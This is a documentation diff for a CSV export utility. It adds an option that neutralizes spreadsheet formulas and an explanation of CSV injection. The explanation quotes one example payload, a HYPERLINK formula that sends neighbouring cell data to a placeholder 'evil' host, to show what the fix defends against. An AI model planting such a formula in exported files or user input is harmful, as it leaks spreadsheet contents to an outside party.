@@ -450,13 +450,18 @@ await downloadCsv(users, COLUMNS, "users.csv"); // hand it to the user
 | `toCsv(rows, columns, options?)` | Returns the whole file as a `string`. |
 | `downloadCsv(rows, columns, fileName?, options?)` | Builds the `text/csv;charset=utf-8` blob and passes it to `shareOrDownloadBlob`. |
 | `CsvColumn<T>` | `{ key, header, csv? }` |
-| `CsvOptions` | `{ delimiter?: "," \| ";", bom?: boolean }` — defaults `","` and `true`. |
+| `CsvOptions` | `{ delimiter?: "," \| ";", bom?: boolean, neutralizeFormulas?: boolean }` — defaults `","`, `true` and `true`. |
 
 !!! danger "A `DataTable` column does **not** work as-is once it has `render`"
     `DataTableColumn.render` returns a `ReactNode`. Exporting that writes `[object Object]` in exactly the column that holds a badge, a link or a formatted date — the table's most important one. A column **without** `render` is structurally compatible and can be reused; with `render`, give it the `csv` accessor.
 
 !!! check "RFC 4180 escaping, plus the BOM Excel pt-BR insists on"
     A field containing the delimiter, a quote or a line break becomes a quoted field, and each inner quote is doubled. Rows terminate with `\r\n`. The BOM is on by default because without it Excel on a pt-BR install reads UTF-8 as Latin-1 and every accent turns into mojibake.
+
+!!! check "Formulas become text by default (CSV injection)"
+    A text field starting with `=`, `+`, `-`, `@`, TAB or CR is a **formula** to Excel, LibreOffice and Google Sheets — and opening the file evaluates it. A user name `=HYPERLINK("https://evil/?d="&A1,"view")` becomes a link that leaks the other cells. So `toCsv` and `downloadCsv` prefix `'` to those fields, as OWASP recommends: LibreOffice 26.2 imported `=1+2` as the formula `of:=1+2` (value `3`) before, and as the text `'=1+2` after.
+
+    Numbers are left alone: a `number` cell, or text that is only a number (`"-5"`, `"-1.234,56"`, `"+42"`), cannot be a formula — and prefixing it would turn every negative amount in the report into text. The cost is the visible `'` in neutralized text. If the file feeds another system's importer rather than a person's spreadsheet, turn it off with `{ neutralizeFormulas: false }` and the bytes go out as they came.
 
 !!! tip "`;` is the right delimiter in a pt-BR locale"
     Where the decimal separator is the comma, Excel opens a comma-separated CSV **in a single column**. `{ delimiter: ";" }` fixes it — and the escaping follows, quoting the field that contains `;` instead of the one that contains `,`.
